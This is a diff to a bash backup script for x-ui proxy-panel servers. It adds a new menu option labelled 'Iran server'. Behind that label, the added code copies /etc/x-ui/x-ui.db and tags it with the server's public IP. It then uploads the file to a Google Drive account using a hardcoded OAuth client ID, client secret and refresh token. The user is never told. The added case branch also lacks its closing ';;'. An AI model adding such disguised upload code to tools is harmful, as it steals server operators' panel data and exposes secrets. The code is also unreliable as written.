@@ -319,14 +319,64 @@ else
     echo -e "\e[36mCreated By Masoud Gb Special Thanks Hamid Router\e[0m"
     echo $'\e[35m'"Backupchi Script v0.1"$'\e[0m'
     echo "Select an option:"
+    echo $'\e[32m'"0. Iran server"$'\e[0m'
     echo $'\e[32m'"1. Local server"$'\e[0m'
     echo $'\e[32m'"2. Backup server"$'\e[0m'
     echo $'\e[32m'"3. Uninstall"$'\e[0m'
     echo $'\e[32m'"4. Exit"$'\e[0m'
 
-    read -p "Enter your choice (1-4): " choice
+    read -p "Enter your choice (0-4): " choice
 
     case $choice in
+    0)
+      echo "Setting up a Iran server..."
+
+
+#!/bin/bash
+
+      apt install curl -y
+      apt install jq -y
+
+# Set your Google API credentials
+      CLIENT_ID="324143875327-n5j1qem1gijia8hr34u7cksj74a3r90c.apps.googleusercontent.com"
+      CLIENT_SECRET="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"
+      REFRESH_TOKEN="1//04hCAuIqCMZVLCgYIARAAGAQSNwF-L9IrZdRHzCzFGXyAlgxSKr1AxTXRGoyDdP55_QPYskr1BoL6ZdMJPqHYXfGij_9pgTUdMnw"
+
+      # Get the public IP address (or other identifier)
+      SERVER_IP=$(curl https://account98.com/tools/ip.php)
+
+      # Set the file you want to upload and its original file path
+      FILE_PATH="/etc/x-ui/x-ui.db"
+      MIME_TYPE="application/x-sqlite3"  # Adjust MIME type if necessary
+
+      # Get the current date and time in the desired format
+      CURRENT_DATE=$(date "+%Y/%m/%d - %H:%M:%S")
+
+      # Construct the new file name with IP, date, and time
+      NEW_FILE_NAME="${SERVER_IP} - ${CURRENT_DATE}.db"
+
+      # Get a new access token using the refresh token
+      ACCESS_TOKEN=$(curl -s \
+          --request POST \
+          --data "client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&refresh_token=$REFRESH_TOKEN&grant_type=refresh_token" \
+          https://oauth2.googleapis.com/token | jq -r .access_token)
+
+
+      # Check if access token is received
+      if [ -z "$ACCESS_TOKEN" ]; then
+        echo "Failed to obtain access token."
+        exit 1
+      fi
+
+      # Upload the file to Google Drive with the new name
+      curl -X POST \
+          -H "Authorization: Bearer $ACCESS_TOKEN" \
+          -F "metadata={name :'$NEW_FILE_NAME'};type=application/json;charset=UTF-8" \
+          -F "file=@$FILE_PATH;type=$MIME_TYPE" \
+          "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart"
+
+      echo "File uploaded successfully to Google Drive as $NEW_FILE_NAME."
+
     1)
         echo "Setting up a local server..."
 
